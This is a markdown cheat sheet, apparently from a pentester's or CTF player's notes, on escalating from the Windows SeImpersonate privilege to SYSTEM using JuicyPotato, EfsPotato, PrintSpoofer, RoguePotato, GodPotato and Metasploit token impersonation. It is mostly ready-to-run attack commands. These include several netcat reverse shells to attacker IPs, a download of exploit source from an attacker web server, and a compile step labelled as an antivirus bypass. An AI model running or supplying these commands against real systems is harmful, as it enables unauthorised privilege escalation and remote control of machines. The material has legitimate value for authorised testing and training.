# SeImpersonate
or SeAssignPrimaryToken. 

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) can be used to **leverage the same privileges and gain** `**NT AUTHORITY\SYSTEM**` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
### JuicyPotato
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 

```powershell
reg query HKCR\CLSID
reg query HKLM\Software\Classes\CLSID


JuicyPotato.exe -l 1337 -p "C:\Users\sophie\nc.exe" -a "-e cmd.exe 10.10.14.6 4444" -t *
```

However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
### SharpEfsPotato
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
```
### EfsPotato
https://github.com/zcgonvh/EfsPotato
```
Invoke-WebRequest -Uri http://10.10.14.165:8000/EfsPotato.cs -OutFile EfsPotato.cs

# Bypass AV
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618

./EfsPotato.exe '.\nc64.exe 10.10.14.165 5555 -e cmd'
```
### RoguePotato
```powershell
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
```
### PrintSpoofer
```powershell
.\PrintSpoofer64.exe -c "C:\Users\Public\Documents\nc64.exe 10.10.14.165 5555 -e cmd"
```
### GodPotato
```powershell
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"
```
### Metasploit
```
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions. The safest process to pick is the services.exe process. First, use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_

### References:
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/